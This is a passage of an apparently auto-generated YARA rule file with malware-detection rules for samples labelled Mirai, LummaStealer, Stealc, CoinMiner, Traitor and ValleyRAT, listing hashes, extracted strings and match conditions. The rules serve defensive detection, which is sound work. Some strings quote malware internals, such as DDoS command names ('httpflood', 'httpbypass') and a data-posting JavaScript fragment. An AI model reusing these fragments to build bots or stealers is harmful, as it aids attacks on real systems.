      $s6 = "pthread_mutex_lock.c" fullword ascii /* score: '18.00'*/
      $s7 = "pthread_mutex_trylock.c" fullword ascii /* score: '18.00'*/
      $s8 = "pthread_mutex_unlock.c" fullword ascii /* score: '18.00'*/
      $s9 = "__pthread_mutex_lock_internal" fullword ascii /* score: '18.00'*/
      $s10 = "pthread_getspecific.c" fullword ascii /* score: '12.00'*/
      $s11 = "read_encoded_value" fullword ascii /* score: '12.00'*/
      $s12 = "__make_stacks_executable" fullword ascii /* score: '12.00'*/
      $s13 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc" fullword ascii /* score: '11.00'*/
      $s14 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/unwind-c.c" fullword ascii /* score: '11.00'*/
      $s15 = "_thread_db_pthread_key_data_seq" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _1ce0393afb262f97a2c3eb27365b1e4e_imphash__1ce0393afb262f97a2c3eb27365b1e4e_imphash__5a1a34df_32 {
   meta:
      description = "dropzone - from files 1ce0393afb262f97a2c3eb27365b1e4e(imphash).exe, 1ce0393afb262f97a2c3eb27365b1e4e(imphash)_5a1a34df.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "9240734ce37fc52b2586a5ee1d5f74ba45e421eb3c5ed275b91c46405a2d6c58"
      hash2 = "5a1a34dfc44f9124a7b84f116a4e2573e46c89e67b9ec25e461829729eae2d63"
   strings:
      $s1 = "service.exe" fullword ascii /* score: '25.00'*/
      $s2 = "audiodg.exe" fullword ascii /* score: '22.00'*/
      $s3 = "httpbypass" fullword ascii /* score: '22.00'*/
      $s4 = "windows.exe" fullword ascii /* score: '22.00'*/
      $s5 = "wrs.exe" fullword ascii /* score: '19.00'*/
      $s6 = "httppost" fullword ascii /* score: '16.00'*/
      $s7 = "httpflood" fullword ascii /* score: '16.00'*/
      $s8 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s9 = "Unknown command or invalid parameters." fullword ascii /* score: '12.00'*/
      $s10 = "\\guid.dat" fullword ascii /* score: '12.00'*/
      $s11 = "Empty command" fullword ascii /* score: '12.00'*/
      $s12 = "GD+7tMl/cq0W9QLLxtvccCOlgLqhlFOamX183XajNoXMf0zfyqY5Hf9KsecuxZ7Bm1yELu3wR95sEAL2j5lmhzWWucUW4LrqtwLD+J3abFtKr58Sk6zjn0jMGq+GMdUw" ascii /* score: '11.00'*/
      $s13 = "GD+7tMl/cq0W9QLLxtvccCOlgLqhlFOamX183XajNoXMf0zfyqY5Hf9KsecuxZ7Bm1yELu3wR95sEAL2j5lmhzWWucUW4LrqtwLD+J3abFtKr58Sk6zjn0jMGq+GMdUw" ascii /* score: '11.00'*/
      $s14 = "Yn0ia6rH8+XoiSHHriu0t3LLeA/RkIOo6G84McNo1AUqaGvAmdvxtXfvbLo37kO/C9TuKnds3LPhcIyCbmlWkpBgcmPGbRZ5Z3jJImou3zfveOAg4fJJOAenn+TdPZTT" ascii /* score: '11.00'*/
      $s15 = ".?AV?$_Func_impl_no_alloc@V<lambda_10>@?DN@??executeTask@@YAXV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@00@Z@" ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 900KB and pe.imphash() == "1ce0393afb262f97a2c3eb27365b1e4e" and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__0116c02e_Mirai_signature__01b09801_Mirai_signature__28c0c6f2_Mirai_signature__2ef19b86_Mirai_signature__33_33 {
   meta:
      description = "dropzone - from files Mirai(signature)_0116c02e.elf, Mirai(signature)_01b09801.elf, Mirai(signature)_28c0c6f2.elf, Mirai(signature)_2ef19b86.elf, Mirai(signature)_33489905.elf, Mirai(signature)_3f0366c3.elf, Mirai(signature)_5a0ba275.elf, Mirai(signature)_6266d46e.elf, Mirai(signature)_6d8090fe.elf, Mirai(signature)_71b35d48.elf, Mirai(signature)_a155fa86.elf, Mirai(signature)_b2d7bf97.elf, Mirai(signature)_bece8d68.elf, Mirai(signature)_ce7aaa40.elf, Mirai(signature)_dc1c46ab.elf, Mirai(signature)_ecf09a4e.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "0116c02eca6948a401ca7051dbd92039dab15135be910f9ebfee9954811380fe"
      hash2 = "01b098017e4c385ca6e13515068c8444938cfc2800b274abe49fca958f45505d"
      hash3 = "28c0c6f22376f482b2237f241de64f8a848d0ae4768bc98bf4699f17f68c57ca"
      hash4 = "2ef19b863a897ed20f534f434e4cafd6198d218d3b77f88b03bf4767de08635b"
      hash5 = "334899051b2d93c935b393d71d1f238bf2543b48e059564626e9b277702318a5"
      hash6 = "3f0366c3eb2026f0237e1caeed26bf6e6a89327aa48013f23d9875ca539fb2b2"
      hash7 = "5a0ba275171dc66897f22e85cc70aa65dc6538351780d980d95ea3b5a7decb44"
      hash8 = "6266d46e4f3ee5d24b72fd02f452b18a8bddc495682fd1bb2d274e5818487bff"
      hash9 = "6d8090fec672f53c725b8113852f711172922038c08439fd14c8e1f4a3f7fb99"
      hash10 = "71b35d489400e96742ba71eca91742c5d16b11ab66ce5719f251b2780469724d"
      hash11 = "a155fa86c4f96777815a3d6a389d98048a4f953cec629601b21201859d0757a6"
      hash12 = "b2d7bf979e0e91c4798fea5c6aaa8dbf358ecab20bebe4a0a7cefbe6656d90ba"
      hash13 = "bece8d68425990bdfc1dc6b3d09bc9fe826a78c6e1bc3bd00c48c6124496d338"
      hash14 = "ce7aaa40299615aa09958e1399dfc39c268c57309c350d0d49b929a5f1a11655"
      hash15 = "dc1c46abc78807ee50f22a58f75df1b7a7f05d7cdb1d1b4036fba0cc6ec19d25"
      hash16 = "ecf09a4e4a1fa563ae7e567dbd8ba42157ae83d06cc55638e683a709c9cbb51a"
   strings:
      $s1 = "_Unwind_decode_target2" fullword ascii /* score: '16.00'*/
      $s2 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/pr-support.c" fullword ascii /* score: '14.00'*/
      $s3 = "__gnu_unwind_execute" fullword ascii /* score: '14.00'*/
      $s4 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/libunwind.S" fullword ascii /* score: '11.00'*/
      $s5 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/unwind-arm.c" fullword ascii /* score: '11.00'*/
      $s6 = "_Unwind_EHT_Header" fullword ascii /* score: '9.00'*/
      $s7 = "_Unwind_VRS_Get" fullword ascii /* score: '9.00'*/
      $s8 = "fnstart" fullword ascii /* score: '8.00'*/
      $s9 = "bitpattern" fullword ascii /* score: '8.00'*/
      $s10 = "fnoffset" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( all of them )
      ) or ( all of them )
}

rule _Mirai_signature__6aaa42b7_Mirai_signature__85f70cc1_34 {
   meta:
      description = "dropzone - from files Mirai(signature)_6aaa42b7.elf, Mirai(signature)_85f70cc1.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "6aaa42b794d3f8987f104542bb2ddb9cfe7c377e833dc2f9fbd24647bd2060f9"
      hash2 = "85f70cc1d485f687bc336321a779861b11ba04e28e2c6c3ea19ae7ed71fcaa1d"
   strings:
      $s1 = "%s: '%s' is not an ELF executable for ARCompact" fullword ascii /* score: '20.50'*/
      $s2 = "%s():%i: Circular dependency, skipping '%s'," fullword ascii /* score: '17.50'*/
      $s3 = "44444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444" ascii /* score: '17.00'*/ /* hex encoded string 'DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD' */
      $s4 = "%s:%i: relocation processing: %s" fullword ascii /* score: '16.50'*/
      $s5 = "%s():%i: %s: usage count: %d" fullword ascii /* score: '14.50'*/
      $s6 = "%s():%i: Lib: %s already opened" fullword ascii /* score: '12.50'*/
      $s7 = "%s():%i: running dtors for library %s at '%p'" fullword ascii /* score: '12.50'*/
      $s8 = "%s():%i: __address: %p  __info: %p" fullword ascii /* score: '12.50'*/
      $s9 = "%s():%i: running ctors for library %s at '%p'" fullword ascii /* score: '12.50'*/
      $s10 = "&|||||" fullword ascii /* reversed goodware string '|||||&' */ /* score: '11.00'*/
      $s11 = "m|||||||" fullword ascii /* reversed goodware string '|||||||m' */ /* score: '11.00'*/
      $s12 = "////////////," fullword ascii /* reversed goodware string ',////////////' */ /* score: '11.00'*/
      $s13 = "searching RUNPATH='%s'" fullword ascii /* score: '10.00'*/
      $s14 = "%s():%i: Module \"%s\" at %p" fullword ascii /* score: '9.50'*/
      $s15 = "%s():%i: removing loaded_modules: %s" fullword ascii /* score: '9.50'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__16679148_Mirai_signature__216b5870_Mirai_signature__3508b667_Mirai_signature__4702ad6e_Mirai_signature__5f_35 {
   meta:
      description = "dropzone - from files Mirai(signature)_16679148.elf, Mirai(signature)_216b5870.elf, Mirai(signature)_3508b667.elf, Mirai(signature)_4702ad6e.elf, Mirai(signature)_5fd8490d.elf, Mirai(signature)_7715522e.elf, Mirai(signature)_9a647936.elf, Mirai(signature)_a0412e1b.elf, Mirai(signature)_b2d7bf97.elf, Mirai(signature)_b63c273a.elf, Mirai(signature)_cd3b6a5d.elf, Mirai(signature)_daf526aa.elf, Mirai(signature)_f279e2ac.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "16679148a73f7b8b1339f778847904d30cc3ca10d6d07674184947fc3e6a6f92"
      hash2 = "216b587035143c7e370c3017a72132b32638157b2751d7e0efd8d5b8b1e90a94"
      hash3 = "3508b6675ca30ad3623a338a59e90b4305049aa36e13f5e05a5c89f9603bec5c"
      hash4 = "4702ad6ee46635683cbe2fe03a8bdb1fa2a7201207584875b6b21f3ed8544ff9"
      hash5 = "5fd8490d3ca5ae394125c37d7bd5b4d5f1cf4dc5010558589f610c0e8a04bfe8"
      hash6 = "7715522e127200b11414fdcb56e50b61fcde115fa124bc0287c92ff81eb0ca78"
      hash7 = "9a64793664809d33c338753c00f4958f8656241ff66c69ec8e8b143843aa484b"
      hash8 = "a0412e1b5ffb39535e98af7bf1118edafc290950f4e8e6b950905c8714578c7c"
      hash9 = "b2d7bf979e0e91c4798fea5c6aaa8dbf358ecab20bebe4a0a7cefbe6656d90ba"
      hash10 = "b63c273ae02c39024b2b690bd6ba4f4099682f12a2f3550ac50a0848e7d2c5f4"
      hash11 = "cd3b6a5d4392242cc662c7afef6cd3753445e837282de24a7da46641d9525e10"
      hash12 = "daf526aaf88b04ac0a046fcc5e1de4d13f57a35fe525b4fcc909d63fcfd812c9"
      hash13 = "f279e2ac99f4355d95769db41066accd329183ac12296c09a7beeafc491daa50"
   strings:
      $s1 = "txt.awsdns-hostedzone-info.com" fullword ascii /* score: '26.00'*/
      $s2 = "execute_xor_commands" fullword ascii /* score: '22.00'*/
      $s3 = "tiktok.com" fullword ascii /* score: '21.00'*/
      $s4 = "dnssec-failover.cloudflare.com" fullword ascii /* score: '21.00'*/
      $s5 = "youtube.com" fullword ascii /* score: '21.00'*/
      $s6 = "dkim20._domainkey.godaddy.com" fullword ascii /* score: '21.00'*/
      $s7 = "any.microsoft-dns.com" fullword ascii /* score: '21.00'*/
      $s8 = "cloudflare.com" fullword ascii /* score: '21.00'*/
      $s9 = "any.dns.oracle.com" fullword ascii /* score: '21.00'*/
      $s10 = "live.com" fullword ascii /* score: '21.00'*/
      $s11 = "ipv6.google.com" fullword ascii /* score: '21.00'*/
      $s12 = "failover.cloudflare.comany.dns.oracle.comany.dns.akamai" fullword ascii /* score: '20.00'*/
      $s13 = ".dehost-dane-self.weberdns.dehost-dnssec.weberdns.deany.isc.organy.cdn77.comany.awsdns" fullword ascii /* score: '19.00'*/
      $s14 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 AtContent/95.5.5" ascii /* score: '19.00'*/
      $s15 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 AtContent/95.5.5" ascii /* score: '19.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 600KB and ( 8 of them )
      ) or ( all of them )
}

rule _CoinMiner_signature__a56f115ee5ef2625bd949acaeec66b76_imphash__Stealc_signature__a56f115ee5ef2625bd949acaeec66b76_imphash__36 {
   meta:
      description = "dropzone - from files CoinMiner(signature)_a56f115ee5ef2625bd949acaeec66b76(imphash).exe, Stealc(signature)_a56f115ee5ef2625bd949acaeec66b76(imphash).exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "0c5931381976b9c08c5887b457af47b84eeabb3b6e9a2babd8fbcf89d9327300"
      hash2 = "cccc4da331a430d4de3d2054e9c5146ecae8a4d30c997ed46f94228f0f2fe392"
   strings:
      $s1 = "DataSync.exe" fullword wide /* score: '22.00'*/
      $s2 = "PROC_IN = %d, Process = %x" fullword ascii /* score: '20.50'*/
      $s3 = "PROC_OUT = %d, Process = %x" fullword ascii /* score: '20.50'*/
      $s4 = "Developed by SyncSolutions Inc. Visit www.syncsolutions.com for more information." fullword wide /* score: '14.00'*/
      $s5 = "DataSync - Enterprise data synchronization tool" fullword wide /* score: '12.00'*/
      $s6 = "https://keepass.info/ 0" fullword ascii /* score: '10.00'*/
      $s7 = "WinLicenseDriverVersion" fullword ascii /* score: '10.00'*/
      $s8 = "Please, contact the software developers with the following codes. Thank you. (version %d.%d.%d)" fullword ascii /* score: '10.00'*/
      $s9 = "/getwlstatus" fullword ascii /* score: '9.00'*/
      $s10 = "/logstatus" fullword ascii /* score: '9.00'*/
      $s11 = "3,$1,$3,$\\9" fullword ascii /* score: '9.00'*/ /* hex encoded string '19' */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 13000KB and pe.imphash() == "a56f115ee5ef2625bd949acaeec66b76" and ( 8 of them )
      ) or ( all of them )
}

rule _25fd615cc11df9cc1885c6d6949cb3c90fa12a15c23fd9963e253dca788a2213_25fd615c_5910ed821501d07c85dea6aafc44b1e7356e7d4b7f30fd244_37 {
   meta:
      description = "dropzone - from files 25fd615cc11df9cc1885c6d6949cb3c90fa12a15c23fd9963e253dca788a2213_25fd615c.elf, 5910ed821501d07c85dea6aafc44b1e7356e7d4b7f30fd244e32c82bc484fdb3_5910ed82.elf, b9ec3b6c8d353160a51f4dfe8cdc004953b49f6fb554dae5b60562c70b73aaa5_b9ec3b6c.elf, Traitor(signature).elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "25fd615cc11df9cc1885c6d6949cb3c90fa12a15c23fd9963e253dca788a2213"
      hash2 = "5910ed821501d07c85dea6aafc44b1e7356e7d4b7f30fd244e32c82bc484fdb3"
      hash3 = "b9ec3b6c8d353160a51f4dfe8cdc004953b49f6fb554dae5b60562c70b73aaa5"
      hash4 = "fdfbfc07248c3359d9f1f536a406d4268f01ed63a856bd6cef9dccb3cf4f2376"
   strings:
      $s1 = "os/exec.init.0" fullword ascii /* score: '12.00'*/
      $s2 = "os/exec.init.0.func1" fullword ascii /* score: '12.00'*/
      $s3 = "os/exec.init" fullword ascii /* score: '12.00'*/
      $s4 = "reflect.name.data" fullword ascii /* score: '11.00'*/
      $s5 = "reflect.(*funcType).common" fullword ascii /* score: '11.00'*/
      $s6 = "reflect.(*ptrType).common" fullword ascii /* score: '11.00'*/
      $s7 = "reflect.(*funcType).Comparable" fullword ascii /* score: '11.00'*/
      $s8 = "reflect.(*ptrType).Comparable" fullword ascii /* score: '11.00'*/
      $s9 = "strconv.min" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.epollwait" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.epollcreate" fullword ascii /* score: '10.00'*/
      $s12 = "reflect.name.tag" fullword ascii /* score: '10.00'*/
      $s13 = "reflect.(*funcType).Key" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.convT2E" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.assertI2I2" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 28000KB and ( 8 of them )
      ) or ( all of them )
}

rule _25fd615cc11df9cc1885c6d6949cb3c90fa12a15c23fd9963e253dca788a2213_25fd615c_5910ed821501d07c85dea6aafc44b1e7356e7d4b7f30fd244_38 {
   meta:
      description = "dropzone - from files 25fd615cc11df9cc1885c6d6949cb3c90fa12a15c23fd9963e253dca788a2213_25fd615c.elf, 5910ed821501d07c85dea6aafc44b1e7356e7d4b7f30fd244e32c82bc484fdb3_5910ed82.elf, b9ec3b6c8d353160a51f4dfe8cdc004953b49f6fb554dae5b60562c70b73aaa5_b9ec3b6c.elf, LummaStealer(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash).exe, Traitor(signature).elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "25fd615cc11df9cc1885c6d6949cb3c90fa12a15c23fd9963e253dca788a2213"
      hash2 = "5910ed821501d07c85dea6aafc44b1e7356e7d4b7f30fd244e32c82bc484fdb3"
      hash3 = "b9ec3b6c8d353160a51f4dfe8cdc004953b49f6fb554dae5b60562c70b73aaa5"
      hash4 = "5d313b578a2eb483e5163af2ef96867fd003edda827345c6e5aab95069161720"
      hash5 = "fdfbfc07248c3359d9f1f536a406d4268f01ed63a856bd6cef9dccb3cf4f2376"
   strings:
      $s1 = "runtime.traceGCSweepSpan" fullword ascii /* score: '15.00'*/
      $s2 = "runtime.getArgInfo" fullword ascii /* score: '15.00'*/
      $s3 = "runtime.traceGCSweepDone" fullword ascii /* score: '15.00'*/
      $s4 = "runtime.heapBits.forward" fullword ascii /* score: '15.00'*/
      $s5 = "runtime.traceGCSweepStart" fullword ascii /* score: '15.00'*/
      $s6 = "runtime.getRandomData" fullword ascii /* score: '15.00'*/
      $s7 = "runtime.getargp" fullword ascii /* score: '15.00'*/
      $s8 = "runtime.name.data" fullword ascii /* score: '14.00'*/
      $s9 = "runtime.name.isExported" fullword ascii /* score: '13.00'*/
      $s10 = "runtime.traceBufPtr.ptr" fullword ascii /* score: '13.00'*/
      $s11 = "runtime.name.tag" fullword ascii /* score: '13.00'*/
      $s12 = "reflexivekey" fullword ascii /* score: '11.00'*/
      $s13 = "indirectkey" fullword ascii /* score: '11.00'*/
      $s14 = "runtime.scanstack.func1" fullword ascii /* score: '11.00'*/
      $s15 = "needkeyupdate" fullword ascii /* score: '11.00'*/
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0x5a4d ) and filesize < 28000KB and pe.imphash() == "a520fd20530cf0b0db6a6c3c8b88d11d" and ( 8 of them )
      ) or ( all of them )
}

rule _25fd615cc11df9cc1885c6d6949cb3c90fa12a15c23fd9963e253dca788a2213_25fd615c_5910ed821501d07c85dea6aafc44b1e7356e7d4b7f30fd244_39 {
   meta:
      description = "dropzone - from files 25fd615cc11df9cc1885c6d6949cb3c90fa12a15c23fd9963e253dca788a2213_25fd615c.elf, 5910ed821501d07c85dea6aafc44b1e7356e7d4b7f30fd244e32c82bc484fdb3_5910ed82.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "25fd615cc11df9cc1885c6d6949cb3c90fa12a15c23fd9963e253dca788a2213"
      hash2 = "5910ed821501d07c85dea6aafc44b1e7356e7d4b7f30fd244e32c82bc484fdb3"
   strings:
      $s1 = "e int64; initialHeapLive uint64; assistQueue struct { lock runtime.mutex; q runtime.gQueue }; sweepWaiters struct { lock runtime" ascii /* score: '23.00'*/
      $s2 = " uint64; runtime.assistQueue struct { runtime.lock runtime.mutex; runtime.q runtime.gQueue }; runtime.sweepWaiters struct { runt" ascii /* score: '23.00'*/
      $s3 = "ve uint64; runtime.assistQueue struct { runtime.lock runtime.mutex; runtime.q runtime.gQueue }; runtime.sweepWaiters struct { ru" ascii /* score: '23.00'*/
      $s4 = ".mutex; list runtime.gList }; cycles uint32; stwprocs int32; maxprocs int32; tSweepTerm int64; tMark int64; tMarkTerm int64; tEn" ascii /* score: '23.00'*/
      $s5 = "i*struct { sync.Mutex; m map[chan<- os.Signal]*signal.handler; ref [65]int64; stopping []signal.stopping }" fullword ascii /* score: '22.00'*/
      $s6 = "= flushGen  gfreecnt= pages at  returned  runqsize= runqueue= s.base()= spinning= stopwait= sweepgen  sweepgen= targetpc= throwi" ascii /* score: '22.00'*/
      $s7 = "d*struct { full runtime.lfstack; empty runtime.lfstack; pad0 cpu.CacheLinePad; wbufSpans struct { lock runtime.mutex; free runti" ascii /* score: '22.00'*/
      $s8 = "ntime.lock runtime.mutex; runtime.list runtime.gList }; runtime.cycles uint32; runtime.stwprocs int32; runtime.maxprocs int32; r" ascii /* score: '21.00'*/
      $s9 = "strings.Builder.Grow: negative countsyntax error scanning complex numberuncaching span but s.allocCount == 0) is smaller than mi" ascii /* score: '21.00'*/
      $s10 = "ime.lock runtime.mutex; runtime.list runtime.gList }; runtime.cycles uint32; runtime.stwprocs int32; runtime.maxprocs int32; run" ascii /* score: '21.00'*/
      $s11 = "bufSpans struct { runtime.lock runtime.mutex; runtime.free runtime.mSpanList; runtime.busy runtime.mSpanList }; _ uint32; runtim" ascii /* score: '18.00'*/
      $s12 = "S*struct { lock runtime.mutex; stack runtime.gList; noStack runtime.gList; n int32 }" fullword ascii /* score: '18.00'*/
      $s13 = "0*struct { lock runtime.mutex; q runtime.gQueue }" fullword ascii /* score: '18.00'*/
      $s14 = ".wbufSpans struct { runtime.lock runtime.mutex; runtime.free runtime.mSpanList; runtime.busy runtime.mSpanList }; _ uint32; runt" ascii /* score: '18.00'*/
      $s15 = "2*struct { lock runtime.mutex; list runtime.gList }" fullword ascii /* score: '18.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 8000KB and ( 8 of them )
      ) or ( all of them )
}

rule _LummaStealer_signature__1d067615_LummaStealer_signature__2d9211bd_40 {
   meta:
      description = "dropzone - from files LummaStealer(signature)_1d067615.html, LummaStealer(signature)_2d9211bd.html"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "1d0676159d0d993541adda69f85c1177edc24be57ff6108dc76dd3310ba05b74"
      hash2 = "2d9211bd2e512a9250409705fbc5a5ebeff9b7e031a9cf01db072623f1b614b6"
   strings:
      $s1 = "p(\"String.prototype.includes\",function(a){return a?a:function(b,c){if(this==null)throw new TypeError(\"The 'this' value for St" ascii /* score: '25.00'*/
      $s2 = "function C(a,b){for(var c=[],d=q(Object.getOwnPropertyNames(Object.prototype)),e=d.next();!e.done;e=d.next())e=e.value,L.include" ascii /* score: '23.00'*/
      $s3 = "s(e)||M.includes(e)||c.push(e);e=Object.prototype;d=[];for(var f=0;f<c.length;f++){var g=c[f];d[f]={name:g,descriptor:Object.get" ascii /* score: '18.00'*/
      $s4 = "function v(){var a=(w=Object.prototype)==null?void 0:w.__lookupGetter__(\"__proto__\"),b=x,c=y;return function(){var d=a.call(th" ascii /* score: '17.00'*/
      $s5 = "      </script></head><body dir=\"ltr\" itemscope itemtype=\"http://schema.org/WebPage\" id=\"yDmH0d\" css=\"yDmH0d\"><div jscon" ascii /* score: '16.00'*/
      $s6 = "),e,f,g,h;r(c,b,{type:\"ACCESS_GET\",origin:(f=window.location.origin)!=null?f:\"unknown\",report:{className:(g=d==null?void 0:(" ascii /* score: '14.00'*/
      $s7 = "(function(){var a=t(),b=window.ppConfig;b&&(b.sealIsEnforced?Object.seal(Object.prototype):b.disableAllReporting||(document.read" ascii /* score: '14.00'*/
      $s8 = "(function(){var a=t(),b=window.ppConfig;b&&(b.sealIsEnforced?Object.seal(Object.prototype):b.disableAllReporting||(document.read" ascii /* score: '13.00'*/
      $s9 = "constructor)==null?void 0:e.name)!=null?g:\"unknown\",stackTrace:(h=Error().stack)!=null?h:\"unknown\"}});return d}}" fullword ascii /* score: '13.00'*/
      $s10 = "=d.constructor)==null?void 0:e.name)!=null?g:\"unknown\",stackTrace:(h=Error().stack)!=null?h:\"unknown\"}});return d}}function " ascii /* score: '13.00'*/
      $s11 = "var D=\"constructor __defineGetter__ __defineSetter__ hasOwnProperty __lookupGetter__ __lookupSetter__ isPrototypeOf propertyIsE" ascii /* score: '12.00'*/
      $s12 = "function z(){var a=(A=Object.prototype)==null?void 0:A.__lookupSetter__(\"__proto__\"),b=x,c=y;return function(d){d=a.call(this," ascii /* score: '12.00'*/
      $s13 = "ind(navigator))!=null?e:u}function u(a,b){var c=new XMLHttpRequest;c.open(\"POST\",a);c.send(b)}" fullword ascii /* score: '12.00'*/
      $s14 = "alue.name);var h;r(b,a,{type:\"SEAL\",origin:(h=window.location.origin)!=null?h:\"unknown\",report:{blockers:d}})}};var N=Math.r" ascii /* score: '12.00'*/
      $s15 = "umerable toString valueOf __proto__ toLocaleString x_ngfn_x\".split(\" \"),E=D.concat,F=navigator.userAgent.match(/Firefox\\/([0" ascii /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x213c and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _25fd615cc11df9cc1885c6d6949cb3c90fa12a15c23fd9963e253dca788a2213_25fd615c_b9ec3b6c8d353160a51f4dfe8cdc004953b49f6fb554dae5b_41 {
   meta:
      description = "dropzone - from files 25fd615cc11df9cc1885c6d6949cb3c90fa12a15c23fd9963e253dca788a2213_25fd615c.elf, b9ec3b6c8d353160a51f4dfe8cdc004953b49f6fb554dae5b60562c70b73aaa5_b9ec3b6c.elf, Traitor(signature).elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "25fd615cc11df9cc1885c6d6949cb3c90fa12a15c23fd9963e253dca788a2213"
      hash2 = "b9ec3b6c8d353160a51f4dfe8cdc004953b49f6fb554dae5b60562c70b73aaa5"
      hash3 = "fdfbfc07248c3359d9f1f536a406d4268f01ed63a856bd6cef9dccb3cf4f2376"
   strings:
      $s1 = "net.stripIPv4Header" fullword ascii /* score: '12.00'*/
      $s2 = "goLookupHost" fullword ascii /* score: '12.00'*/
      $s3 = "runtime.convI2I" fullword ascii /* score: '10.00'*/
      $s4 = "sort.reverse.Len" fullword ascii /* score: '10.00'*/
      $s5 = "runtime.assertI2I" fullword ascii /* score: '10.00'*/
      $s6 = "net.readFull" fullword ascii /* score: '10.00'*/
      $s7 = "runtime.convT2I" fullword ascii /* score: '10.00'*/
      $s8 = "net.byMaskLength.Len" fullword ascii /* score: '10.00'*/
      $s9 = "syscall.Getpagesize" fullword ascii /* score: '8.00'*/
      $s10 = "syscall.netlinkMessageHeaderAndData" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 28000KB and ( all of them )
      ) or ( all of them )
}

rule _1bc85591ca960e5958cb3a7639bbfe43453d9db6bb794c3d14961d5a45c30acb_1bc85591_1e7bb739e7eb4a5c7016c3c3f63e3bfa278596fcaa2f2f836_42 {
   meta:
      description = "dropzone - from files 1bc85591ca960e5958cb3a7639bbfe43453d9db6bb794c3d14961d5a45c30acb_1bc85591.elf, 1e7bb739e7eb4a5c7016c3c3f63e3bfa278596fcaa2f2f836ee52b756929dc7f_1e7bb739.macho, 25fd615cc11df9cc1885c6d6949cb3c90fa12a15c23fd9963e253dca788a2213_25fd615c.elf, 5910ed821501d07c85dea6aafc44b1e7356e7d4b7f30fd244e32c82bc484fdb3_5910ed82.elf, b9ec3b6c8d353160a51f4dfe8cdc004953b49f6fb554dae5b60562c70b73aaa5_b9ec3b6c.elf, Traitor(signature).elf, ValleyRAT(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "1bc85591ca960e5958cb3a7639bbfe43453d9db6bb794c3d14961d5a45c30acb"
      hash2 = "1e7bb739e7eb4a5c7016c3c3f63e3bfa278596fcaa2f2f836ee52b756929dc7f"
      hash3 = "25fd615cc11df9cc1885c6d6949cb3c90fa12a15c23fd9963e253dca788a2213"
      hash4 = "5910ed821501d07c85dea6aafc44b1e7356e7d4b7f30fd244e32c82bc484fdb3"
      hash5 = "b9ec3b6c8d353160a51f4dfe8cdc004953b49f6fb554dae5b60562c70b73aaa5"
      hash6 = "fdfbfc07248c3359d9f1f536a406d4268f01ed63a856bd6cef9dccb3cf4f2376"
      hash7 = "4ac5c741eac35ec797d10f0f60575e4825128fcd2587705bc6403169eaf32e88"
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0xfacf or uint16(0) == 0x5a4d ) and filesize < 29000KB and pe.imphash() == "d42595b695fc008ef2c56aabd8efd68e" )
      
}

rule _1bc85591ca960e5958cb3a7639bbfe43453d9db6bb794c3d14961d5a45c30acb_1bc85591_1e7bb739e7eb4a5c7016c3c3f63e3bfa278596fcaa2f2f836_43 {
   meta:
